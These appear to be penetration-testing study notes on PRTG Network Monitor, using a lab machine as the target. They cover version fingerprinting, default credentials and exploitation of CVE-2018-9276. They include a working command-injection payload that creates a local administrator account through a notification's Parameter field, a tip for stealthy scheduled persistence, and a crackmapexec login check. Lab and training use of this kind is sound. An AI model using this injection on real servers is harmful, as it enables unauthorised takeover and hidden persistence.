# PRTG Network Monitor

## What Is PRTG?
PRTG Network Monitor is **agentless network monitoring software** — bandwidth usage, uptime, and stats from routers, switches, servers, etc. Made by Paessler (monitoring solutions since 1997). Uses autodiscovery to scan a network segment and build a device list, then polls devices via ICMP, SNMP, WMI, NetFlow, and more. Fully AJAX-based web UI, plus a desktop app (Windows/Linux/macOS).

## Quick Facts
- First released 2003; free version (100 sensors / 20 hosts) since 2015
- ~300,000 users worldwide
- Notable users: Naples International Airport, Virginia Tech, 7-Eleven
- 26 CVEs historically; only 4 have easy public PoCs — 2× XSS, 1× DoS, 1× **authenticated command injection** (the focus here)
- Rarely exposed externally; common on internal pentests
- Demonstrated on HTB machine **Netmon**

## Discovery / Footprinting / Enumeration

- Typically found on common web ports: **80, 443, or 8080** (web interface port is configurable by an admin).

```bash
sudo nmap -sV -p- --open -T4 10.129.201.50

8080/tcp  open  http  Indy httpd 17.3.33.2830 (Paessler PRTG bandwidth monitor)
```

### Default Credentials
- `prtgadmin:prtgadmin` — often **pre-filled on the login page** and left unchanged.
- Also flagged automatically by tools like EyeWitness and Nessus.

### Version Fingerprinting via cURL
```bash
curl -s http://10.129.201.50:8080/index.htm -A "Mozilla/5.0 (compatible; MSIE 7.01; Windows NT 5.0)" | grep version

<span class="prtgversion">&nbsp;PRTG Network Monitor 17.3.33.2830 </span>
```

> [!important] Vulnerable version
> `17.3.33.2830` maps to **CVE-2018-9276** — authenticated command injection in the PRTG System Administrator web console, affecting versions before 18.2.39.

If default creds fail, try common variants — in the walkthrough, `prtgadmin:Password123` worked.

## Leveraging CVE-2018-9276 (Authenticated Command Injection)

**Root cause:** When creating a new notification, the **Parameter** field is passed directly into a PowerShell script with **no input sanitisation**.

### Exploitation Steps
1. **Setup → Account Settings → Notifications**
2. Click **Add new notification**, give it a name (e.g. `pwn`)
3. Tick **Execute Program**
4. Under **Program File**, select `Demo exe notification - outfile.ps1`
5. In the **Parameter** field, inject a command, e.g.:
   ```
   test.txt;net user prtgadm1 Pwn3d_by_PRTG! /add;net localgroup administrators prtgadm1 /add
   ```
   (In a real engagement, prefer something non-destructive like a reverse shell instead of creating an account.)
6. Click **Save**

> [!tip] Persistence angle
> The notification can be **scheduled** to run later instead of immediately — useful as a stealthy persistence mechanism on a longer engagement.

7. Go back to the Notifications list, click **Test** on the new notification.
8. A popup confirms: *"EXE notification is queued up"*.

> [!warning] Blind execution
> This is **blind command execution** — no direct output/feedback. Confirm success via a listener callback, or by checking whether the new credentials actually work.

### Confirming Success
```bash
sudo crackmapexec smb 10.129.201.50 -u prtgadm1 -p Pwn3d_by_PRTG!

SMB  10.129.201.50  445  APP03  [+] APP03\prtgadm1:Pwn3d_by_PRTG! (Pwn3d!)
```
Confirmed local admin access. Other options for follow-up access: RDP, WinRM (evil-winrm), or Impacket's `wmiexec.py` / `psexec.py`.
